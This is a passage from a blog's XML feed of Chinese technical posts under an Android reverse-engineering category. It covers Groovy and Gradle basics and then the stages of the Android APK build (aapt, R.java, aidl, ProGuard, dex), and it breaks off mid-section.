的具体实现.</li></ul><h2 id="map-list"><a href="#map-list" class="headerlink" title="map_list"></a><code>map_list</code></h2><p><code>map_list</code> 中大部分 item 跟 header 中的相应描述相同，都是介绍了各个区的偏移和大小，但是 <code>map_list</code> 中描述的更加全面，包括了 <code>HEADER_ITEM 、TYPE_LIST、STRING_DATA_ITEM、DEBUG_INFO_ITEM</code> 等信息。</p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dex文件格式 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Gradle学习（一）</title>
      <link href="/2018/02/09/gradle/"/>
      <url>/2018/02/09/gradle/</url>
      <content type="html"><![CDATA[<h2 id="Groovy介绍"><a href="#Groovy介绍" class="headerlink" title="Groovy介绍"></a>Groovy介绍</h2><ul><li><p>Groovy中支持动态类型，即定义变量的时候可以不指定其类型。(Groovy中，变量定义可以使用关键字def。def不是必须的，但是为了代码清晰，建议还是使用def关键字)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def a = <span class="number">5</span>;</span><br><span class="line">def b = <span class="string">"groovy"</span></span><br></pre></td></tr></table></figure></li><li><p>函数的定义，我们也无需进行参数类型的声明.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">String <span class="title">testFunction</span><span class="params">(arg1,arg2)</span></span>&#123;<span class="comment">//无需指定参数类型</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>除了变量定义可以不指定类型外，Groovy中函数的返回值也可以是无类型的。比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//无类型的函数定义，必须使用def关键字</span></span><br><span class="line"><span class="function">def  <span class="title">nonReturnTypeFunc</span><span class="params">()</span></span>&#123;</span><br><span class="line">     last_line   <span class="comment">//最后一行代码的执行结果就是本函数的返回值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果指定了函数返回类型，则可不必加def关键字来定义函数</span></span><br><span class="line"><span class="function">String  <span class="title">getString</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"I am a string"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>函数返回值：Groovy的函数里，可以不使用return xxx来设置xxx为函数返回值。如果不使用return语句的话，则函数里最后一句代码的执行结果被设置成返回值。比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">getSomething</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="string">"getSomething return value"</span> <span class="comment">//如果这是最后一行代码，则返回类型为String</span></span><br><span class="line"></span><br><span class="line">      <span class="number">1000</span> <span class="comment">//如果这是最后一行代码，则返回类型为Integer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>注意，如果函数定义时候指明了返回值类型的话，函数中则必须返回正确的数据类型，否则运行时报错。如果使用了动态类型的话，你就可以返回任何类型了。</p><ul><li>除了每行代码不用加分号外，Groovy中函数调用的时候还可以不加括号。比如：<br><code>println(&quot;test&quot;) 等价于 println &quot;test&quot;</code></li><li>函数调用支持 参数名：参数值方式调用<br><code>apply plugin: &#39;com.android.library&#39;</code><br>plugin:参数名，’com.android.library’：参数值</li><li><p>强大字符串支持功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//单引号''中的内容严格对应Java中的String，不对$符号进行转义</span></span><br><span class="line">def singleQuote=<span class="string">'I am $ dolloar'</span>  <span class="comment">//输出就是I am $ dolloar</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//双引号,则它会$表达式先求值。</span></span><br><span class="line">def doubleQuoteWithoutDollar = <span class="string">"I am one dollar"</span> <span class="comment">//输出 I am one dollar</span></span><br><span class="line">def x = <span class="number">1</span></span><br><span class="line">def doubleQuoteWithDollar = <span class="string">"I am $x dolloar"</span> <span class="comment">//输出I am 1 dolloar</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过换行实现每一行的间距</span></span><br><span class="line">str3 = <span class="string">''</span><span class="string">'begin</span></span><br><span class="line"><span class="string">    line1</span></span><br><span class="line"><span class="string">    line2</span></span><br><span class="line"><span class="string">end'</span><span class="string">''</span></span><br></pre></td></tr></table></figure></li><li><p>闭包<br>（英语：Closure），又称词法闭包（Lexical Closure）或函数闭包（function closures），是引用了自由变量的函数。这个被引用的自由变量将和这个函数一同存在，即使已经离开了创造它的环境也不例外。所以，有另一种说法认为闭包是由函数和与其相关的引用环境组合而成的实体。对于闭包的实现，从函数式编程的角度来看就为了解决一个输入对应一个输出的问题。例如当我们想实现一个加法，我们必须通过传递两个参数来实现，但是借助于函数式编程，我们可以做到只传递一个参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">plusAny</span><span class="params">(first)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> function(second) &#123;</span><br><span class="line">        <span class="keyword">return</span> first + second;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var longLiveSeniorFunc = plusAny(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">longLiveSeniorFunc(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li></ul><p><strong>闭包，是一种数据类型，它代表了一段可执行的代码</strong>。其外形如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def aClosure = &#123;<span class="comment">//闭包是一段代码，所以需要用花括号括起来..  </span></span><br><span class="line">    String param1, <span class="keyword">int</span> param2 -&gt;  <span class="comment">//这个箭头很关键。箭头前面是参数定义，箭头后面是代码  </span></span><br><span class="line">    println <span class="string">"this is code"</span> <span class="comment">//这是代码，最后一句是返回值，  </span></span><br><span class="line">   <span class="comment">//也可以使用return，和Groovy中普通函数一样  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>简而言之，Closure的定义格式是：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def xxx = &#123;paramters -&gt; code&#125;  <span class="comment">//或者  </span></span><br><span class="line">def xxx = &#123;无参数，纯code&#125;  这种<span class="keyword">case</span>不需要-&gt;符号</span><br></pre></td></tr></table></figure></p><p>说实话，从C/C++语言的角度看，闭包和函数指针很像。闭包定义好后，要调用它的方法就是：<br>闭包对象.call(参数)  或者更像函数指针调用的方法：<br>闭包对象(参数)<br>比如：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aClosure.call(<span class="string">"this is string"</span>,<span class="number">100</span>)  或者  </span><br><span class="line">aClosure(<span class="string">"this is string"</span>, <span class="number">100</span>)</span><br></pre></td></tr></table></figure></p><p>如果闭包没定义参数的话，则隐含有一个参数，这个参数名字叫it，和this的作用类似。it代表闭包的参数。<br>比如<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def greeting = &#123; <span class="string">"Hello, $it!"</span> &#125;</span><br><span class="line"><span class="function"><span class="keyword">assert</span> <span class="title">greeting</span><span class="params">(<span class="string">'Patrick'</span>)</span> </span>== <span class="string">'Hello, Patrick!'</span></span><br></pre></td></tr></table></figure></p><p>等同于：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def greeting = &#123; it -&gt; <span class="string">"Hello, $it!"</span> &#125;</span><br><span class="line"><span class="function"><span class="keyword">assert</span> <span class="title">greeting</span><span class="params">(<span class="string">'Patrick'</span>)</span> </span>== <span class="string">'Hello, Patrick!'</span></span><br></pre></td></tr></table></figure></p><p>但是，如果在闭包定义时，采用下面这种写法，则表示闭包没有参数.<br><code>def noParamClosure = { -&gt; true }</code><br>这个时候，我们就不能给noParamClosure传参数了。</p><ul><li>Groovy中，当函数的最后一个参数是闭包的话，可以省略圆括号。比如<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def  <span class="title">testClosure</span><span class="params">(<span class="keyword">int</span> a1,String b1, Closure closure)</span></span>&#123;</span><br><span class="line">      <span class="comment">//do something</span></span><br><span class="line">      closure() <span class="comment">//调用闭包</span></span><br><span class="line">&#125;</span><br><span class="line">那么调用的时候，就可以免括号！</span><br><span class="line">testClosure (<span class="number">4</span>, <span class="string">"test"</span>, &#123;</span><br><span class="line">   println <span class="string">"i am in closure"</span></span><br><span class="line">&#125; )  <span class="comment">//外面的括号可以不写..</span></span><br></pre></td></tr></table></figure></li></ul><p>注意，这个特点非常关键，因为以后在Gradle中经常会出现这样的代码。<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1foamyow3zkj309k03aglh.jpg" alt=""><br>省略圆括号虽然使得代码简洁，看起来更像脚本语言，但是它这经常会让我confuse，以doLast为例，完整的代码应该按下面这种写法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">doLast(&#123;</span><br><span class="line">   println <span class="string">'Hello world!'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>有了圆括号，你会知道 doLast只是把一个Closure对象传了进去。很明显，它不代表这段脚本解析到doLast的时候就会调用println ‘Hello world!’ 。<br>但是把圆括号去掉后，就感觉好像println ‘Hello world!’立即就会被调用一样.</p><h2 id="Gradle工作流程"><a href="#Gradle工作流程" class="headerlink" title="Gradle工作流程"></a>Gradle工作流程</h2><p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1foalfwtituj30800ay0t4.jpg" alt=""><br>如上图所示，在一个Project中，除了我们项目自身的代码和资源之外，会有多个与项目构建相关的.gradle文件。<br>Gradle中，每一个待编译的工程都叫一个Project。每一个Project在构建的时候都包含一系列的Task。比如一个Android APK的编译可能包含：Java源码编译Task、资源编译Task、JNI编译Task、lint检查Task、打包生成APK的Task、签名Task等。</p><p>Gradle的工作流程如下图所示，在每一个工作流程的前后，我们都可以进行一些hook操作，来满足自己的需求。<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1foalgl23j6j30q7065js9.jpg" alt=""><br>Gradle工作包含三个阶段：</p><ul><li>首先是初始化阶段。对我们前面的multi-project build而言，就是执行settings.gradle</li><li>Initiliazation phase的下一个阶段是Configration阶段。</li><li>Configration阶段的目标是解析每个project中的build.gradle。比如multi-project build例子中，解析每个子目录中的build.gradle。在这两个阶段之间，我们可以加一些定制化的Hook。这当然是通过API来添加的。</li><li>Configuration阶段完了后，整个build的project以及内部的Task关系就确定了。一个Project包含很多Task，每个Task之间有依赖关系。Configuration会建立一个有向图来描述Task之间的依赖关系。所以，我们可以添加一个HOOK，即当Task关系图建立好后，执行一些操作。</li><li>最后一个阶段就是执行任务了。当然，任务执行完后，我们还可以加Hook。</li></ul><p>简言之，Gradle有一个初始化流程，这个时候settings.gradle会执行。<br>在配置阶段，每个Project都会被解析，其内部的任务也会被添加到一个有向图里，用于解决执行过程中的依赖关系。然后才是执行阶段。你在gradle xxx中指定什么任务，gradle就会将这个xxx任务链上的所有任务全部按依赖顺序执行一遍。</p><h2 id="Gradle-Wrapper"><a href="#Gradle-Wrapper" class="headerlink" title="Gradle Wrapper"></a>Gradle Wrapper</h2><p>Gradle Wrapper ，意为 Gradle 的包装，什么意思呢？<br>假设我们本地有多个项目，一个是比较老的项目，还用着 Gradle 1.0 的版本，一个是比较新的项目用了 Gradle 2.0 的版本，但是你两个项目肯定都想要同时运行的，如果你只装了 Gradle 1.0 的话那肯定不行，所以为了解决这个问题，Google 推出了 Gradle Wrapper 的概念。<br>就是他在你每个项目都配置了一个指定版本的 Gradle ，你可以理解为每个 Android 项目本地都有一个小型的 Gradle ，通过这个每个项目你可以支持用不同的 Gradle 版本来构建项目。<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1foanvlylrhj312m0fk415.jpg" alt=""></p><h2 id="Android-项目包含的-Gradle-配置文件"><a href="#Android-项目包含的-Gradle-配置文件" class="headerlink" title="Android 项目包含的 Gradle 配置文件"></a>Android 项目包含的 Gradle 配置文件</h2><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1foanyhm51xj308z0ieq44.jpg" alt=""></p><ul><li>9GAG/app/build.gradle<br>这个文件是 app 文件夹下这个 Module 的 gradle 配置文件，也可以算是整个项目最主要的 gradle 配置文件。</li><li>9GAG/extras/ShimmerAndroid/build.gradle<br>每一个 Module 都需要有一个 gradle 配置文件，语法都是一样，唯一不同的是开头声明的是<code>apply plugin: &#39;com.android.library&#39;</code></li><li>9GAG/gradle<br>这个目录下有个 wrapper 文件夹，里面可以看到有两个文件，我们主要看下 gradle-wrapper.properties 这个文件的内容：<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1foaouah7rdj311q09cgnu.jpg" alt=""><br>可以看到里面声明了 gradle 的目录与下载路径以及当前项目使用的 gradle 版本，这些默认的路径我们一般不会更改的，这个文件里指明的 gradle 版本不对也是很多导包不成功的原因之一。</li><li>9GAG/build.gradle<br>这个文件是整个项目的 gradle 基础配置文件，默认的内容就是声明了 android gradle plugin 的版本。<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1foaow75wlsj30tw0gi40d.jpg" alt=""></li><li>9GAG/settings.gradle<br>这个文件是全局的项目配置文件，里面主要声明一些需要加入 gradle 的 module，我们来看看 9GAG 该文件的内容：<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1foaoxckd1bj31800piq6r.jpg" alt=""></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.infoq.com/cn/articles/android-in-depth-gradle" target="_blank" rel="noopener">http://www.infoq.com/cn/articles/android-in-depth-gradle</a><br><a href="http://android.walfud.com/android-gradle-看这一篇就够了/" target="_blank" rel="noopener">http://android.walfud.com/android-gradle-看这一篇就够了/</a></p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gradle </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Android项目构建过程分析</title>
      <link href="/2018/02/09/build/"/>
      <url>/2018/02/09/build/</url>
      <content type="html"><![CDATA[<h2 id="构建过程"><a href="#构建过程" class="headerlink" title="构建过程"></a>构建过程</h2><p>项目的构建：当我们打开一个项目，我们可以看到的是我们写的Java Code文件or Other JVM Code，资源文件，Build配置文件，但是通过run the project，我们就可以得到一个在我们的Andoid设备上可以运行的Apk，上线应用市场，还需要我们对其进行签名处理，来确保我们App的唯一性和安全性。整个过程就是所谓的项目构建。如下图所示。<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1foadhjy9xvj30fr052wen.jpg" alt=""><br>如何实现整个构建的过程，对于每一个构建的步骤，都需要相应的功能模块来进行，比如Java Code编译，如何打成dex包等等，而这Android则为我们提供了相应的工具，在Android Studio命令行窗口中，我们可以通过相应的命令行来进行控制，但是，整个构建过程涉及到很多的步骤，很多的工具的使用，如果都通过命令行来进行控制，势必会相当麻烦，因此Androd Studio等IDE则对整个过程进行了一个打包，当我们在Run project的时候，底层的打包工具就会被调用，打包流程都会自动执行。然后我们只需要对构建文件按照自己的需求进行相应的配置，就可以构建出自己所需要的项目。<br>那么，整个Andoid项目的构建过程中，都执行了那些构建的任务呢？</p><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>首先看一下，Google官方为我们提供的详细的构建过程图<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1foadr7q3yvj30ew0oiabi.jpg" alt=""><br>图中绿色标注为其中用到的相应工具，蓝色代表的是中间生成的各类文件类型。</p><ul><li>首先aapt工具会将资源文件进行转化，生成对应资源ID的R文件和资源文件。</li><li>adil工具会将其中的aidl接口转化成Java的接口</li><li>至此，Java Compiler开始进行Java文件向class文件的转化，将R文件，Java源代码，由aidl转化来的Java接口，统一转化成.class文件。</li><li>通过dx工具将class文件转化为dex文件。</li><li>此时我们得到了经过处理后的资源文件和一个dex文件，当然，还会存在一些其它的资源文件，这个时候，就是将其打包成一个类似apk的文件。但还并不是直接可以安装在Android系统上的APK文件。</li><li>通过签名工具对其进行签名。</li><li>通过Zipalign进行优化，提升运行速度（原理后文会提及）。</li><li>最终，一个可以安装在我们手机上的APK完成了。</li></ul><p>下图是一个Android项目构建过程的详细步骤图。<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1foadmdugoxj30rl0u3q87.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1foadql0c6bj30qe0to779.jpg" alt=""></p><h2 id="aapt打包资源文件，生成R-java和编译后的资源（二进制文件）"><a href="#aapt打包资源文件，生成R-java和编译后的资源（二进制文件）" class="headerlink" title="aapt打包资源文件，生成R.java和编译后的资源（二进制文件）"></a>aapt打包资源文件，生成R.java和编译后的资源（二进制文件）</h2><p>第1步：aapt打包资源文件，生成R.java和编译后的资源（二进制文件）<br>讲到资源文件的处理，我们先来看一下Android中的资源文件有那些呢?Android应用程序资源可以分为两大类，分别是assets和res：</p><ol><li><p>assets类资源放在android根目录的assets子目录下，它里面保存的是一些原始的文件，可以以任何方式来进行组织。这些文件最终会被原装不动地打包在apk文件中。如果我们要在程序中访问这些文件，那么就需要指定文件名来访问。例如，假设在assets目录下有一个名称为filename的文件，那么就可以使用以下代码来访问它：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AssetManager am= getAssets();    </span><br><span class="line">InputStream is = assset.open(<span class="string">"filename"</span>);</span><br></pre></td></tr></table></figure></li><li><p>res类资源放在android根目录的res子目录下，它里面保存的文件大多数都会被编译，并且都会被赋予资源ID。这样我们就可以在程序中通过ID来访问res类的资源。res类资源按照不同的用途可以进一步划分为以下10种子类型：<br>layout(布局文件)，drawable，xml，value，menu，raw，color，anim，animator，mipmap。<br>为了使得一个应用程序能够在运行时同时支持不同的大小和密度的屏幕，以及支持国际化，即支持不同的国家地区和语言，Android应用程序资源的组织方式有18个维度，每一个维度都代表一个配置信息，从而可以使得应用程序能够根据设备的当前配置信息来找到最匹配的资源来展现在UI上，从而提高用户体验。由于Android应用程序资源的组织方式可以达到18个维度，因此就要求Android资源管理框架能够快速定位最匹配设备当前配置信息的资源来展现在UI上，否则的话，就会影响用户体验。为了支持Android资源管理框架快速定位最匹配资源，Android资源打包工具aapt在编译和打包资源的过程中，会执行以下两个额外的操作：</p></li></ol><ul><li>赋予每一个非assets资源一个ID值，这些ID值以常量的形式定义在一个R.java文件中。</li><li>生成一个resources.arsc文件，用来描述那些具有ID值的资源的配置信息，它的内容就相当于是一个资源索引表。包含了所有的id值的数据集合。在该文件中，如果某个id对应的是string，那么该文件会直接包含该值，如果id对应的资源是某个layout或者drawable资源，那么该文件会存入对应资源的路径。</li></ul><p><strong>为什么要转化为二进制文件？</strong></p><ul><li>二进制格式的XML文件占用空间更小。这是由于所有XML元素的标签、属性名称、属性值和内容所涉及到的字符串都会被统一收集到一个字符串资源池中去，并且会去重。有了这个字符串资源池，原来使用字符串的地方就会被替换成一个索引到字符串资源池的整数值，从而可以减少文件的大小。</li><li>二进制格式的XML文件解析速度更快。这是由于二进制格式的XML元素里面不再包含有字符串值，因此就避免了进行字符串解析，从而提高速度。<br>有了资源ID以及资源索引表之后，Android资源管理框架就可以迅速将根据设备当前配置信息来定位最匹配的资源了。</li></ul><h3 id="R-java解读"><a href="#R-java解读" class="headerlink" title="R.java解读"></a>R.java解读</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1foae9ndz40j31h80q87fa.jpg" alt=""><br>原始的资源文件res/values/strings.xml内容如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;  </span><br><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"app_name"</span>&gt;</span>Cert<span class="tag">&lt;/<span class="name">string</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"hello_world"</span>&gt;</span>Hello world!<span class="tag">&lt;/<span class="name">string</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"action_settings"</span>&gt;</span>Settings<span class="tag">&lt;/<span class="name">string</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>对应R.java文件的内容:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">R</span> </span>&#123;  </span><br><span class="line">              ...  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">string</span> </span>&#123;  </span><br><span class="line">                     ...  </span><br><span class="line">        <span class="comment">/**  Description of the choose target button in a ShareActionProvider (share UI). [CHAR LIMIT=NONE]  </span></span><br><span class="line"><span class="comment">         */</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> abc_shareactionprovider_share_with=<span class="number">0x7f0a000c</span>;  </span><br><span class="line">        <span class="comment">/**  Description of a share target (both in the list of such or the default share button) in a ShareActionProvider (share UI). [CHAR LIMIT=NONE]  </span></span><br><span class="line"><span class="comment">         */</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> abc_shareactionprovider_share_with_application=<span class="number">0x7f0a000b</span>;  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> action_settings=<span class="number">0x7f0a000f</span>;  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> app_name=<span class="number">0x7f0a000d</span>;  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> hello_world=<span class="number">0x7f0a000e</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">                     ...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到每个资源文件在R中都是一个<strong>class</strong>，每个资源项名称都分配了一个id，id值是一个四字节无符号整数，格式是这样的：0xpptteeee，（p代表的是package，t代表的是type，e代表的是entry），最高字节代表Package ID，次高字节代表Type ID，后面两个字节代表Entry ID。</p><p>Package ID相当于是一个命名空间，限定资源的来源。Android系统当前定义了两个资源命令空间，其中一个系统资源命令空间，它的Package ID等于0x01，另外一个是应用程序资源命令空间，它的Package ID等于0x7f。所有位于[0x01, 0x7f]之间的Package ID都是合法的，而在这个范围之外的都是非法的Package ID。</p><p>Type ID是指资源的类型ID。资源的类型有animator、anim、color、drawable、layout、menu、raw、string和xml等等若干种，每一种都会被赋予一个ID。</p><p>Entry ID是指每一个资源在其所属的资源类型中所出现的次序。注意，不同类型的资源的Entry ID有可能是相同的，但是由于它们的类型不同，我们仍然可以通过其资源ID来区别开来。</p><h3 id="AAPT"><a href="#AAPT" class="headerlink" title="AAPT"></a>AAPT</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1foaetlrxa6j30k50idwg6.jpg" alt=""><br>通过上图我们可以看到Resources是通过resources.arsc把Resource的ID转化成资源文件的名称，然后交由AssetManager来加载的。<br>而Resources.arsc这个文件是存放在APK包中的，他是由AAPT工具在打包过程中生成的，他本身是一个资源的索引表，里面维护者资源ID、Name、Path或者Value的对应关系，AssetManager通过这个索引表，就可以通过资源的ID找到这个资源对应的文件或者数据。<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1foaev2m0asj30p20c2jsm.jpg" alt=""></p><p>AAPT这个工具在打包过程中主要做了下列工作：</p><ul><li>把”assets”和”res/raw”目录下的所有资源进行打包（会根据不同的文件后缀选择压缩或不压缩），而”res/“目录下的其他资源进行编译或者其他处理（具体处理方式视文件后缀不同而不同，例如：”.xml”会编译成二进制文件，”.png”文件会进行优化等等）后才进行打包；</li><li>会对除了assets资源之外所有的资源赋予一个资源ID常量，并且会生成一个资源索引表resources.arsc；</li><li>编译AndroidManifest.xml成二进制的XML文件；</li><li>把上面3个步骤中生成结果保存在一个*.ap_文件，并把各个资源ID常量定义在一个R.java中；</li></ul><p>*.ap_这个文件存放在build/intermediates/res的目录下，下图是这个文件存放的路径截图：<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1foaexegnhsj30t211awjr.jpg" alt=""><br>解压出来。<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1foaezs5xmlj312019ytp9.jpg" alt=""></p><h2 id="aidl"><a href="#aidl" class="headerlink" title="aidl"></a>aidl</h2><p>第2步：aidl<br>aidl，全名Android Interface Definition Language，即Android接口定义语言。是我们在编写进程间通信的代码的时候，定义的接口。<br>输入：aidl后缀的文件。输出：可用于进程通信的C/S端java代码，位于build/generated/source/aidl。</p><h2 id="Java源码编译"><a href="#Java源码编译" class="headerlink" title="Java源码编译"></a>Java源码编译</h2><p>第3步：Java源码编译<br>我们有了R.java和aidl生成的Java文件，再加上工程的源代码，现在可以使用javac进行正常的java编译生成class文件了。</p><p>输入：java source的文件夹（另外还包括了build/generated下的：R.java, aidl生成的java文件，以及BuildConfig.java）。<br>输出：对于gradle编译，可以在build/intermediates/classes里，看到输出的class文件。<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1foafpkdhndj30pi16kgr2.jpg" alt=""></p><h2 id="代码混淆（proguard）"><a href="#代码混淆（proguard）" class="headerlink" title="代码混淆（proguard）"></a>代码混淆（proguard）</h2><p>第4步：代码混淆（proguard）<br>源码编译之后，我们可能还会对其进行代码的混淆，混淆的作用是增加反编译的难度，同时也将一些代码的命名进行了缩短，减少代码占用的空间。混淆完成之后，会生成一个混淆前后的映射表，这个是用来在反应我们的应用执行的时候的一些堆栈信息，可以将混淆后的信息转化为我们混淆前实际代码中的内容。<br>而这个过程使用的工具就是ProGuard，是一个开源的Java代码混淆器（obfuscation）。ADT r8开始它被默认集成到了Android SDK中。 其具备三个主要功能。</p><ul><li>压缩 - 移除无效的类、属性、方法等</li><li>优化 - 优化bytecode移除没用的结构</li><li>混淆 - 把类名、属性名、方法名替换为晦涩难懂的1到2个字母的名字<br>当然它也只能混淆Java代码，Android工程中Native代码，资源文件（图片、xml），它是无法混淆的。而且对于Java的常量值也是无法混淆的，所以不要使用常量定义密码等重要信息。同时对于混淆，我们可以通过代码制定去混淆哪些，不去混淆哪些。</li></ul><h2 id="转化为dex"><a href="#转化为dex" class="headerlink" title="转化为dex"></a>转化为dex</h2><p>第5步：转化为dex<br>调用dx.bat将所有的class文件转化为classes.dex文件，dx会将class转换为Dalvik字节码，生成常量池，消除冗余数据等。由于dalvik是一种针对嵌入式设备而特殊设计的java虚拟机，所以dex文件与标准的class文件在结构设计上有着本质的区别,当java程序编译成class后，使用dx工具将所有的class文件整合到一个dex文件，目的是其中各个类能够共享数据，在一定程度上降低了冗余，同时也是文件结构更加经凑，实验表明，dex文件是传统jar文件大小的50%左右。class文件结构和dex文件结构比对。<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1foafs9dnnij30ao093t9g.jpg" alt=""></p><h2 id="apkbuilder"><a href="#apkbuilder" class="headerlink" 